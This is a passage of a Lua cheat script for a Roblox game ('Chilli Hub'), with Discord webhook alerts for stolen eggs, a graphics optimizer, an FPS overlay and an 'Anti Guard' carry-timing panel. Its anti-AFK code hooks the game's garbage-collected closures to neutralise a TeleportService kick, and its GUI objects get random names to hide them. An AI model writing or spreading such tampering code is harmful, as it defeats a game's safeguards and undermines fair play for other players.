									flag4 = tostring(record.AssetCategory) == category
								end
							end

							if flag4 then
								tbl11.Carry = nil
								local mutations = type(record.Mutations) == "table" and record.Mutations or {}

								task.spawn(function()
									if fn26() then
										fn27(fn24("Egg Stolen!", record.AssetCategory, record.AssetScale, mutations, carry.Area))
									end
								end)

								break
							end
						end
					end
				end

				task.wait(1.5)
			end
		end)

		local function fn28(arg)
			local input = tbl11.Input
			if type(input) ~= "table" then
				return
			end

			for _, v14 in ipairs({ "Set", "SetValue" }) do
				local ok, result = pcall(function()
					return input[v14]
				end)

				if ok and type(result) == "function" and pcall(result, input, arg, false) then
					return
				end
			end
		end

		tbl11.Input = v6:CreateInput({
			Name = "Webhook URL",
			Placeholder = "https://discord.com/api/webhooks/...",
			Default = tbl11.Saved,
			MaxLength = 256,
			Callback = function(arg)
				local v14 = string.gsub(tostring(arg or ""), "%s", "")
				local flag2 = v14 == "" and tbl11.Saved ~= ""
				local flag3

				if flag2 then
					local loadedAt = tbl11.LoadedAt
					flag3 = os.clock() - loadedAt < 5
				else
					flag3 = flag2
				end

				if flag3 then
					tbl11.Url = tbl11.Saved
					task.defer(fn28, tbl11.Saved)
					return
				end

				tbl11.Url = v14

				if (v14 == "" or fn13(v14)) and v14 ~= tbl11.Saved and type(writefile) == "function" then
					if pcall(writefile, tbl11.Path, v14) then
						tbl11.Saved = v14
					end
				end
			end,
		})

		v6:CreateToggle({
			Name = "Ping @everyone",
			Default = false,
			Callback = function(arg)
				tbl11.PingEveryone = arg == true
			end,
		})

		v6:CreateToggle({
			Name = "Notify Stolen Eggs",
			Note = "Post every egg you bring home",
			Default = false,
			Callback = function(arg)
				tbl11.Stolen = arg == true
			end,
		})
	end

	v9 = v2:CreateTab({ Name = "Misc", SectionsExpanded = true })
	local v14
	v14 = v9:CreateSection({ Name = "Performance", Expanded = true })
	local flag2 = false

	v14:CreateSlider({
		Name = "FPS Cap",
		Min = 30,
		Max = 1000,
		Default = 240,
		AllowDecimals = false,
		Increment = 1,
		Unit = " FPS",
		Callback = function(arg)
			local n16 = math.clamp(math.floor(tonumber(arg) or 240), 30, 1000)
			if type(setfpscap) == "function" and pcall(setfpscap, n16) then
				flag2 = false
				return
			end

			if not flag2 then
				flag2 = true
				fn8("FPS Cap Unavailable", "This environment does not support setfpscap.")
			end
		end,
	})

	do
		local Lighting = game:GetService("Lighting")
		local n16 = 0.003
		local flag3 = false
		local n17 = 0
		local thread = nil
		local tbl11 = {}
		local tbl12 = {}
		local obj = setmetatable({}, { __mode = "k" })
		local tbl13 = {}
		local connection = nil

		local function fn13(arg, arg2, arg3)
			local ok, result = pcall(arg)
			if not ok then
				return
			end
			tbl12[#tbl12 + 1] = { Setter = arg2, Value = result }
			pcall(arg2, arg3)
		end

		local function fn14(arg, arg2, arg3)
			local v15 = obj[arg]

			if not v15 then
				local tbl14 = {}
				obj[arg] = tbl14
				v15 = tbl14
			end

			if v15[arg2] == nil then
				local ok, result = pcall(function()
					return arg[arg2]
				end)

				if not ok then
					return
				end
				v15[arg2] = { Value = result }
			end

			pcall(function()
				arg[arg2] = arg3
			end)
		end

		local function fn15(arg)
			if not flag3 or not arg.Parent then
				return
			end

			if arg:IsA("ParticleEmitter") then
				fn14(arg, "Enabled", false)
				fn14(arg, "Rate", 0)
			elseif arg:IsA("Trail") or arg:IsA("Beam") then
				fn14(arg, "Enabled", false)
			elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
				fn14(arg, "Enabled", false)
				fn14(arg, "Brightness", 0)
			elseif arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
				fn14(arg, "Enabled", false)
			elseif arg:IsA("Explosion") then
				fn14(arg, "Visible", false)
			elseif arg:IsA("SpecialMesh") then
				fn14(arg, "TextureId", "")
			elseif arg:IsA("Decal") or arg:IsA("Texture") then
				if not (arg.Name == "face" and arg.Parent and arg.Parent.Name == "Head") then
					fn14(arg, "Transparency", 1)
				end
			elseif arg:IsA("MeshPart") then
				fn14(arg, "RenderFidelity", Enum.RenderFidelity.Performance)
				fn14(arg, "TextureID", "")
				fn14(arg, "CastShadow", false)
				fn14(arg, "Reflectance", 0)
				fn14(arg, "Material", Enum.Material.SmoothPlastic)
			elseif arg:IsA("BasePart") then
				fn14(arg, "CastShadow", false)
				fn14(arg, "Reflectance", 0)
				fn14(arg, "Material", Enum.Material.SmoothPlastic)
			elseif arg:IsA("PostEffect") then
				fn14(arg, "Enabled", false)
			elseif arg:IsA("Clouds") then
				fn14(arg, "Cover", 0)
				fn14(arg, "Density", 0)
			elseif arg:IsA("Atmosphere") then
				fn14(arg, "Density", 0)
				fn14(arg, "Haze", 0)
				fn14(arg, "Glare", 0)
			end
		end

		local function fn16()
			for _, v15 in ipairs(tbl11) do
				if v15.Connected then
					v15:Disconnect()
				end
			end

			table.clear(tbl11)

			if connection then
				pcall(function()
					connection:Disconnect()
				end)

				connection = nil
			end
		end

		local function fn17()
			local rendering = settings().Rendering
			local terrain = workspace.Terrain

			local function fn18(arg, arg2, arg3)
				fn13(function()
					return arg[arg2]
				end, function(arg4)
					arg[arg2] = arg4
				end, arg3)
			end

			fn18(rendering, "QualityLevel", Enum.QualityLevel.Level01)
			fn18(rendering, "MeshPartDetailLevel", Enum.MeshPartDetailLevel.Level01)
			fn18(rendering, "EditQualityLevel", Enum.QualityLevel.Level01)

			local ok, result = pcall(function()
				return UserSettings():GetService("UserGameSettings")
			end)

			if ok and result then
				fn18(result, "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
			end

			fn18(Lighting, "GlobalShadows", false)
			fn18(Lighting, "ShadowSoftness", 0)
			fn18(Lighting, "FogEnd", 9e9)
			fn18(Lighting, "Technology", Enum.Technology.Legacy)
			fn18(Lighting, "EnvironmentDiffuseScale", 0)
			fn18(Lighting, "EnvironmentSpecularScale", 0)
			fn18(terrain, "Decoration", false)
			fn18(terrain, "WaterWaveSize", 0)
			fn18(terrain, "WaterWaveSpeed", 0)
			fn18(terrain, "WaterReflectance", 0)
			fn18(terrain, "WaterTransparency", 1)
		end

		local function fn18(arg, arg2)
			local now = os.clock()

			for _, descendant in ipairs(arg:GetDescendants()) do
				if not flag3 or n17 ~= arg2 then
					return false
				end
				fn15(descendant)

				if n16 < os.clock() - now then
					RunService.Heartbeat:Wait()
					now = os.clock()
				end
			end

			return true
		end

		local function fn19()
			if not flag3 or #tbl13 == 0 then
				return
			end
			local now = os.clock()

			while #tbl13 > 0 do
				local v15 = table.remove(tbl13)
				fn15(v15)
				if not (n16 < os.clock() - now) then
					continue
				end
				break
			end
		end

		local function fn20()
			local now = os.clock()

			for k, v15 in pairs(obj) do
				if k.Parent then
					for k2, v16 in pairs(v15) do
						pcall(function()
							k[k2] = v16.Value
						end)
					end
				end

				obj[k] = nil

				if os.clock() - now > n16 then
					RunService.Heartbeat:Wait()
					now = os.clock()
				end
			end
		end

		local function fn21()
			if not flag3 then
				return
			end
			flag3 = false
			n17 += 1
			fn16()
			table.clear(tbl13)

			if thread then
				pcall(task.cancel, thread)
				thread = nil
			end

			fn20()

			for i = #tbl12, 1, -1 do
				local v15 = tbl12[i]
				pcall(v15.Setter, v15.Value)
			end

			table.clear(tbl12)
		end

		local function fn22()
			if flag3 then
				return
			end
			flag3 = true
			n17 += 1
			local v15 = n17
			fn17()

			local function fn23(arg)
				tbl11[#tbl11 + 1] = arg.DescendantAdded:Connect(function(descendant)
					if flag3 and n17 == v15 then
						tbl13[#tbl13 + 1] = descendant
					end
				end)
			end

			fn23(workspace)
			fn23(Lighting)

			connection = RunService.Heartbeat:Connect(function()
				if flag3 and n17 == v15 then
					fn19()
				end
			end)

			thread = task.spawn(function()
				if fn18(workspace, v15) then
					fn18(Lighting, v15)
				end
			end)
		end

		fn4(fn21)

		v14:CreateToggle({
			Name = "Optimizer",
			Note = "Strip shadows, textures and effects for the highest FPS",
			Default = false,
			Callback = function(arg)
				if arg then
					fn22()
				else
					task.spawn(fn21)
				end
			end,
		})
	end

	do
		local Stats = game:GetService("Stats")
		local n16 = 132
		local n17 = 0.085
		local n18 = 0.2
		local n19 = 8
		local v15 = v2:CreateState({ Name = "FPS and Ping Position", Default = {} })

		local function fn13()
			local v16 = v15:Get()
			if type(v16) == "table" and type(v16.XOffset) == "number" and type(v16.YOffset) == "number" then
				return UDim2.new(tonumber(v16.XScale) or 0, v16.XOffset, tonumber(v16.YScale) or 0, v16.YOffset)
			end
			return UDim2.new(0, 16, 0, 16)
		end

		local function fn14(arg)
			v15:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
		end

		local color4 = Color3.fromRGB(58, 255, 55)
		local color5 = Color3.fromRGB(255, 214, 84)
		local color6 = Color3.fromRGB(255, 96, 96)
		local color7 = Color3.fromRGB(150, 150, 158)
		local flag3 = false
		local tbl11 = {}
		local screenGui = nil
		local frame = nil
		local uiScale = nil
		local v16 = nil
		local v17 = nil
		local n20 = 1
		local n21 = 0
		local n22 = 0
		local v18 = nil
		local v19 = nil
		local font = nil

		pcall(function()
			font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
		end)

		local function fn15(arg)
			if arg >= 100 then
				return color4
			end

			if arg >= 50 then
				return color5
			end
			return color6
		end

		local function fn16(arg)
			if arg <= 90 then
				return color4
			end

			if arg <= 180 then
				return color5
			end
			return color6
		end

		local function fn17()
			if not uiScale then
				return
			end
			local currentCamera = workspace.CurrentCamera
			currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

			if currentCamera.X < 1 then
				currentCamera = Vector2.new(1280, 720)
			end

			uiScale.Scale = math.clamp(currentCamera.X * n17 / n16, 0.7, 1.4) * n20
		end

		local function fn18()
			for _, v20 in ipairs(tbl11) do
				pcall(function()
					v20:Disconnect()
				end)
			end

			table.clear(tbl11)

			if screenGui then
				pcall(function()
					screenGui:Destroy()
				end)
			end

			screenGui = nil
			frame = nil
			uiScale = nil
			v16 = nil
			v17 = nil
			v18 = nil
			v19 = nil
			n21 = 0
		end

		local function createTextLabel(parent, arg, arg2, textColor3)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = fn3()
			textLabel.BackgroundTransparency = 1
			textLabel.Position = UDim2.fromOffset(arg, 9)
			textLabel.Size = UDim2.fromOffset(arg2, 16)
			textLabel.Text = ""
			textLabel.TextColor3 = textColor3
			textLabel.TextScaled = true
			textLabel.TextXAlignment = Enum.TextXAlignment.Left

			if font then
				textLabel.FontFace = font
			else
				textLabel.Font = Enum.Font.GothamBold
			end

			textLabel.Parent = parent
			return textLabel
		end

		local function fn19()
			fn18()
			screenGui = Instance.new("ScreenGui")
			screenGui.Name = fn3()
			screenGui.Archivable = false
			screenGui.DisplayOrder = 58
			screenGui.IgnoreGuiInset = true
			screenGui.ResetOnSpawn = false
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			frame = Instance.new("Frame")
			frame.Name = fn3()
			frame.Active = true
			frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
			frame.BackgroundTransparency = 0.28
			frame.BorderSizePixel = 0
			frame.Position = fn13()
			frame.Size = UDim2.fromOffset(132, 34)
			frame.Parent = screenGui
			local uiCorner = Instance.new("UICorner")
			uiCorner.Name = fn3()
			uiCorner.CornerRadius = UDim.new(0, 12)
			uiCorner.Parent = frame
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = fn3()
			uiStroke.Color = Color3.fromRGB(255, 255, 255)
			uiStroke.Thickness = 1
			uiStroke.Transparency = 0.9
			uiStroke.Parent = frame
			uiScale = Instance.new("UIScale")
			uiScale.Name = fn3()
			uiScale.Parent = frame
			fn17()
			v16 = createTextLabel(frame, 12, 34, color4)
			createTextLabel(frame, 48, 22, color7).Text = "FPS"
			local frame2 = Instance.new("Frame")
			frame2.Name = fn3()
			frame2.AnchorPoint = Vector2.new(0.5, 0.5)
			frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame2.BackgroundTransparency = 0.85
			frame2.BorderSizePixel = 0
			frame2.Position = UDim2.new(0, 74, 0.5, 0)
			frame2.Size = UDim2.fromOffset(1, 14)
			frame2.Parent = frame
			v17 = createTextLabel(frame, 82, 30, color4)
			createTextLabel(frame, 113, 14, color7).Text = "ms"
			screenGui.Parent = v3
			local currentCamera = workspace.CurrentCamera

			if currentCamera then
				tbl11[#tbl11 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn17)
			end

			local flag4 = false
			local v20 = nil
			local vector2 = Vector2.zero
			local position = nil

			tbl11[#tbl11 + 1] = frame.InputBegan:Connect(function(input)
				local v21 = flag4
				local flag5

				if flag4 then
					flag5 = v21
				else
					flag5 = input.UserInputState ~= Enum.UserInputState.Begin
				end

				if flag5 then
					return
				end
				local flag6 = input.UserInputType == Enum.UserInputType.Touch
				if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag6 then
					return
				end
				flag4 = true
				v20 = flag6 and input or nil
				vector2 = Vector2.new(input.Position.X, input.Position.Y)
				position = frame.Position
			end)

			tbl11[#tbl11 + 1] = UserInputService.InputChanged:Connect(function(input)
				if not flag4 or not frame or not position then
					return
				end
				local flag5 = v20 and input == v20
				local flag6

				if flag5 then
					flag6 = flag5
				else
					flag6 = not v20 and input.UserInputType == Enum.UserInputType.MouseMovement
				end

				if not flag6 then
					return
				end
				local n23 = Vector2.new(input.Position.X, input.Position.Y) - vector2
				frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n23.X, position.Y.Scale, position.Y.Offset + n23.Y)
			end)

			tbl11[#tbl11 + 1] = UserInputService.InputEnded:Connect(function(input)
				if not flag4 then
					return
				end
				local flag5 = v20 and input == v20
				local flag6

				if flag5 then
					flag6 = flag5
				else
					flag6 = not v20 and input.UserInputType == Enum.UserInputType.MouseButton1
				end

				if flag6 then
					flag4 = false
					v20 = nil
					position = nil

					if frame then
						fn14(frame.Position)
					end
				end
			end)

			tbl11[#tbl11 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
				if not flag3 or not v16 then
					return
				end
				local n23 = math.clamp(deltaTime, 0.001, 1)
				local n24 = 1 / n23

				if n21 <= 0 then
					n21 = n24
				else
					n21 += (n24 - n21) * (1 - math.exp(-n23 * n19))
				end

				local now = os.clock()
				if now < n22 then
					return
				end
				n22 = now + n18
				local n25 = math.floor(n21 + 0.5)
				local text = tostring(n25)

				if text ~= v18 then
					v18 = text
					v16.Text = text
					v16.TextColor3 = fn15(n25)
				end

				local n26 = 0

				pcall(function()
					n26 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
				end)

				local n27 = math.floor(n26 + 0.5)
				local text2 = tostring(n27)

				if text2 ~= v19 then
					v19 = text2
					v17.Text = text2
					v17.TextColor3 = fn16(n27)
				end
			end)
		end

		v14:CreateSlider({
			Name = "FPS and Ping Size",
			Min = 60,
			Max = 160,
			Default = 100,
			AllowDecimals = false,
			Increment = 1,
			Unit = "%",
			SubOf = v14:CreateToggle({
				Name = "FPS and Ping",
				Default = true,
				Callback = function(arg)
					flag3 = arg == true

					if flag3 then
						fn19()
					else
						fn18()
					end
				end,
			}),
			Callback = function(arg)
				n20 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)
				fn17()
			end,
		})

		fn4(fn18)
	end
end

do
	local v10 = v9:CreateSection({ Name = "Utility", Expanded = true })
	local tbl7 = { Enabled = true, Alive = true, Silenced = {} }

	local function fn9()
		if type(getconnections) ~= "function" then
			return {}
		end
		local ok, result = pcall(getconnections, localPlayer.Idled)
		return ok and type(result) == "table" and result or {}
	end

	local function fn10()
		for _, v11 in ipairs(fn9()) do
			if pcall(function()
				v11:Disable()
			end) then
				tbl7.Silenced[#tbl7.Silenced + 1] = v11
			end
		end
	end

	local function fn11()
		local silenced = tbl7.Silenced

		if #silenced == 0 then
			silenced = fn9()
		end

		for _, v11 in ipairs(silenced) do
			pcall(function()
				v11:Enable()
			end)
		end

		table.clear(tbl7.Silenced)
	end

	local obj = setmetatable({}, { __index = function()
		return function()
		end
	end })

	local tbl8 = {}

	local function fn12()
		local tbl9 = {}
		if type(getgc) ~= "function" or type(debug) ~= "table" or type(debug.getupvalues) ~= "function" then
			return tbl9
		end
		local ok, result = pcall(getgc, false)
		if not ok or type(result) ~= "table" then
			return tbl9
		end

		for _, v11 in ipairs(result) do
			if type(v11) == "function" and islclosure(v11) then
				local ok2, result2 = pcall(debug.info, v11, "s")

				if ok2 and type(result2) == "string" and string.find(result2, "AntiAFK", 1, true) then
					local ok3, result3 = pcall(debug.getupvalues, v11)

					if ok3 and type(result3) == "table" then
						for k, v12 in pairs(result3) do
							if typeof(v12) == "Instance" and v12.ClassName == "TeleportService" then
								tbl9[#tbl9 + 1] = { Fn = v11, Index = k, Original = v12 }
							end
						end
					end
				end
			end
		end

		return tbl9
	end

	local function fn13()
		for _, v11 in ipairs(fn12()) do
			local ok, result = pcall(debug.getupvalue, v11.Fn, v11.Index)

			if ok and typeof(result) == "Instance" then
				if pcall(debug.setupvalue, v11.Fn, v11.Index, obj) then
					tbl8[#tbl8 + 1] = v11
				end
			end
		end
	end

	local function fn14()
		for _, v11 in ipairs(tbl8) do
			pcall(debug.setupvalue, v11.Fn, v11.Index, v11.Original)
		end

		table.clear(tbl8)
	end

	local function fn15()
		fn10()

		if #tbl8 == 0 then
			fn13()
		end
	end

	local connection = localPlayer.CharacterAdded:Connect(function()
		task.delay(1, function()
			if tbl7.Alive and tbl7.Enabled then
				table.clear(tbl7.Silenced)
				pcall(fn15)
			end
		end)
	end)

	fn4(function()
		pcall(function()
			connection:Disconnect()
		end)
	end)

	fn4(function()
		tbl7.Alive = false
		fn11()
		fn14()
	end)

	task.spawn(function()
		while tbl7.Alive do
			if tbl7.Enabled then
				fn15()
			end

			task.wait(600)
		end
	end)

	v10:CreateToggle({
		Name = "Anti AFK",
		Default = true,
		Callback = function(arg)
			tbl7.Enabled = arg ~= false

			if tbl7.Enabled then
				fn15()
			else
				fn11()
				fn14()
			end
		end,
	})
end

local GuiService, StarterGui, antiGuard, tbl7, chilliAntiGuard, tbl8, tbl9, n3, flag, tbl10
local tbl11, fn9, hui, fn10, ScreenGui, UIScale, fn11

do
	local TweenService = game:GetService("TweenService")
	GuiService = game:GetService("GuiService")
	StarterGui = game:GetService("StarterGui")
	antiGuard = tbl4.AntiGuard

	tbl7 = {
		Target = "line",
		LineOffset = 8,
		Height = 45,
		OffsetX = -90,
		OffsetZ = -35,
		Jitter = 0,
		Point = false,
		Disguise = true,
		Limp = true,
		Facing = "Zero",
		Freeze = false,
		StartAt = 0,
		Steps = {
			{ At = 0.1, To = "home" },
			{ At = 0.33, To = "home" },
			{ At = 0.56, To = "home" },
			{ At = 0.75, To = "start" },
		},
		ReleaseAt = 0.8,
		WeldScanGap = 0.03,
		BusyLimit = 2.5,
	}

	local function fn12(arg, arg2, arg3, arg4, arg5, arg6)
		local tbl12 = {}

		for i = 1, arg do
			tbl12[#tbl12 + 1] = { At = arg2 + arg3 * (i - 1), To = "home" }
		end

		tbl12[#tbl12 + 1] = { At = arg4, To = "start" }

		return {
			Target = "home",
			LineOffset = 8,
			Height = 0,
			OffsetX = 0,
			OffsetZ = 0,
			Jitter = 0,
			Point = false,
			Disguise = true,
			Limp = false,
			Facing = "Zero",
			Freeze = true,
			StartAt = 0,
			StartRandom = 0,
			HopRandom = 0.085,
			HoldRandom = 0.395,
			Steps = tbl12,
			ReleaseAt = arg5,
			WeldScanGap = 0.03,
			BusyLimit = arg6,
		}
	end

	chilliAntiGuard = { LightDark = tbl7, Default = fn12(25, 0, 0.05, 1.27, 1.52, 2.5) }

	pcall(function()
		getgenv().ChilliAntiGuard = chilliAntiGuard
	end)

	tbl8 = {
		Card = Color3.fromRGB(15, 15, 19),
		CardTop = Color3.fromRGB(24, 22, 28),
		Stroke = Color3.fromRGB(48, 46, 56),
		Text = Color3.fromRGB(240, 238, 244),
		AccentA = Color3.fromRGB(255, 72, 72),
		AccentB = Color3.fromRGB(255, 150, 60),
		Good = Color3.fromRGB(80, 220, 140),
		Work = Color3.fromRGB(255, 190, 70),
		Bad = Color3.fromRGB(240, 90, 90),
		Off = Color3.fromRGB(58, 56, 66),
	}

	tbl9 = {
		{ Path = { "GearGiver_Slap", "Podium" }, Offset = Vector3.new(-16.415, 21.072, -6.106) },
		{
			Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
		{
			Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
	}

	n3 = 52
	flag = true
	tbl10 = {}

	tbl11 = {
		AreaId = nil,
		SignalCarrying = false,
		WeldCarrying = false,
		Carrying = false,
		Active = false,
		Disguise = nil,
		FlashRequest = nil,
		FlashUntil = 0,
	}

	fn9 = function()
		local tbl12 = {}

		for i = 1, math.random(10, 16) do
			tbl12[i] = string.char(math.random(97, 122))
		end

		return table.concat(tbl12)
	end

	hui = nil

	pcall(function()
		hui = gethui()
	end)

	hui = hui or CoreGui

	local function fn13(arg, parent, arg2)
		local instance = Instance.new(arg)
		instance.Name = fn9()
		local v10 = pairs
		local tbl12 = arg2 or {}

		for k, v11 in v10(tbl12) do
			instance[k] = v11
		end

		instance.Parent = parent
		return instance
	end

	fn10 = function(arg, arg2, arg3, arg4)
		local ok, result = pcall(function()
			return TweenService:Create(arg, TweenInfo.new(arg2, arg4 or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), arg3)
		end)

		if ok and result then
			result:Play()
		end
	end

	ScreenGui = fn13("ScreenGui", nil, {
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		DisplayOrder = -100,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	})

	local Frame = fn13("Frame", ScreenGui, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 1, -120),
		Size = UDim2.fromOffset(226, 52),
		BackgroundTransparency = 1,
	})

	local UIScale2 = fn13("UIScale", Frame, { Scale = 1 })

	local Frame2 = fn13("Frame", Frame, {
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = tbl8.Card,
		BorderSizePixel = 0,
		Active = true,
	})

	fn13("UICorner", Frame2, { CornerRadius = UDim.new(0, 14) })
	UIScale = fn13("UIScale", Frame2, { Scale = 0.86 })
	fn13("UIGradient", Frame2, { Color = ColorSequence.new(tbl8.CardTop, tbl8.Card), Rotation = 90 })

	local UIStroke = fn13("UIStroke", Frame2, {
		Thickness = 1.5,
		Color = Color3.fromRGB(255, 255, 255),
		Transparency = 0.2,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})

	local UIGradient = fn13("UIGradient", UIStroke, { Color = ColorSequence.new(tbl8.Stroke, tbl8.Stroke) })

	local Frame3 = fn13("Frame", Frame2, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 10, 0.5, 0),
		Size = UDim2.fromOffset(36, 36),
		BackgroundColor3 = Color3.fromRGB(28, 26, 32),
		BorderSizePixel = 0,
		ZIndex = 2,
	})

	fn13("UICorner", Frame3, { CornerRadius = UDim.new(0, 11) })
	local UIStroke2 = fn13("UIStroke", Frame3, { Thickness = 1.5, Color = tbl8.Off, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })

	local ImageLabel = fn13("ImageLabel", Frame3, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromScale(0.86, 0.86),
		BackgroundTransparency = 1,
		Image = "rbxassetid://128961717706452",
		ImageTransparency = 0.35,
		ScaleType = Enum.ScaleType.Crop,
		ZIndex = 3,
	})

	fn13("UICorner", ImageLabel, { CornerRadius = UDim.new(0, 8) })
	local UIScale3 = fn13("UIScale", ImageLabel, { Scale = 1 })
	local color2 = Color3.fromRGB

	fn13("UIGradient", fn13("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 7),
		Size = UDim2.new(1, -112, 0, 15),
		Font = Enum.Font.BuilderSansExtraBold,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Text = "Chilli Hub",
		ZIndex = 2,
	}), { Color = ColorSequence.new(Color3.fromRGB(255, 120, 100), color2(255, 190, 110)) })

	fn13("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 22),
		Size = UDim2.new(1, -112, 0, 20),
		Font = Enum.Font.GothamBlack,
		TextSize = 15,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = tbl8.Text,
		Text = "Anti Guard",
		ZIndex = 2,
	})

	local TextButton = fn13("TextButton", Frame2, {
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Text = "",
		ZIndex = 2,
	})

	fn13("UICorner", TextButton, { CornerRadius = UDim.new(1, 0) })
	local UIGradient2 = fn13("UIGradient", TextButton, { Color = ColorSequence.new(tbl8.Off, tbl8.Off) })

	local Frame4 = fn13("Frame", TextButton, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 3, 0.5, 0),
		Size = UDim2.fromOffset(16, 16),
		BackgroundColor3 = Color3.fromRGB(245, 245, 250),
		BorderSizePixel = 0,
		ZIndex = 3,
	})

	fn13("UICorner", Frame4, { CornerRadius = UDim.new(1, 0) })

	local function fn14()
		return antiGuard.Enabled and tbl8.AccentA or tbl8.Off
	end

	local function render(arg)
		local n4 = arg and 0 or 0.28

		if antiGuard.Enabled then
			UIGradient2.Color = ColorSequence.new(tbl8.AccentA, tbl8.AccentB)
			local v10 = UIGradient
			local colorSequence = ColorSequence.new
			local tbl12 = {}
			local v11 = ColorSequenceKeypoint.new(0, tbl8.Stroke)
			local v12 = ColorSequenceKeypoint.new(0.45, tbl8.AccentA)
			local v13 = ColorSequenceKeypoint.new(0.55, tbl8.AccentB)
			tbl12[1] = v11
			tbl12[2] = v12
			tbl12[3] = v13

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, tbl8.Stroke))
				table.move(values, 1, values.n, 4, tbl12)
			end

			v10.Color = colorSequence(tbl12)
			fn10(Frame4, n4, { Position = UDim2.new(1, -19, 0.5, 0) }, Enum.EasingStyle.Back)
			fn10(ImageLabel, n4, { ImageTransparency = 0 })
			fn10(UIStroke, 0.3, { Transparency = 0 })
		else
			UIGradient2.Color = ColorSequence.new(tbl8.Off, tbl8.Off)
			UIGradient.Color = ColorSequence.new(tbl8.Stroke, tbl8.Stroke)
			fn10(Frame4, n4, { Position = UDim2.new(0, 3, 0.5, 0) }, Enum.EasingStyle.Back)
			fn10(ImageLabel, n4, { ImageTransparency = 0.35 })
			fn10(UIStroke, 0.3, { Transparency = 0.2 })
		end

		if tbl11.FlashUntil <= os.clock() then
			fn10(UIStroke2, n4, { Color = fn14() })
		end
	end

	fn11 = function(arg, arg2)
		tbl11.FlashRequest = { Color = arg, Hold = arg2 }
	end

	local function fn15()
		local flashRequest = tbl11.FlashRequest
		if not flashRequest then
			return
		end
		tbl11.FlashRequest = nil
		tbl11.FlashUntil = os.clock() + (flashRequest.Hold or 0)
		fn10(UIStroke2, 0.2, { Color = flashRequest.Color })

		if flashRequest.Hold then
			task.delay(flashRequest.Hold, function()
				local flag2 = flag

				if flag then
					local flashUntil = tbl11.FlashUntil
					flag2 = os.clock() >= flashUntil
				end

				if flag2 then
					fn10(UIStroke2, 0.3, { Color = fn14() })
				end
			end)
		end
	end

	local function fn16(arg)
		local handle = antiGuard.Handle
		if type(handle) ~= "table" then
			return
		end

		for _, v10 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return handle[v10]
			end)

			if ok and type(result) == "function" and pcall(result, handle, arg) then
				return
			end
		end
	end

	antiGuard.Render = render

	local TextButton2 = fn13("TextButton", Frame2, {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Text = "",
		ZIndex = 10,
	})

	tbl10[#tbl10 + 1] = TextButton2.MouseButton1Click:Connect(function()
		antiGuard.Enabled = not antiGuard.Enabled
		render(false)
		fn16(antiGuard.Enabled)
		fn10(UIScale3, 0.12, { Scale = 1.15 })

		task.delay(0.12, function()
			if flag then
				fn10(UIScale3, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
			end
		end)
	end)

	local size = TextButton.Size

	tbl10[#tbl10 + 1] = TextButton2.MouseEnter:Connect(function()
		fn10(TextButton, 0.15, { Size = size + UDim2.fromOffset(2, 2) })
	end)

	tbl10[#tbl10 + 1] = TextButton2.MouseLeave:Connect(function()
		fn10(TextButton, 0.15, { Size = size })
	end)

	local tbl12 = {
		Hotbar = true,
		HotBar = true,
		Toolbar = true,
		ToolBar = true,
		Backpack = true,
		Inventory = true,
	}

	local tbl13 = {}
	local huge = math.huge
	local huge2 = math.huge
	local rotation = 0
	local n4 = nil

	local function fn17(arg)
		while arg do
			if arg:IsA("GuiObject") and not arg.Visible then
				return false
			end

			if arg:IsA("LayerCollector") then
				return arg.Enabled
			end
			arg = arg.Parent
		end

		return false
	end

	local function fn18()
		local ok, result = pcall(function()
			return GuiService:GetGuiInset().Y
		end)

		return ok and result or 0
	end

	local function fn19(arg)
		local v10 = nil

		for _, descendant in ipairs(arg:GetDescendants()) do
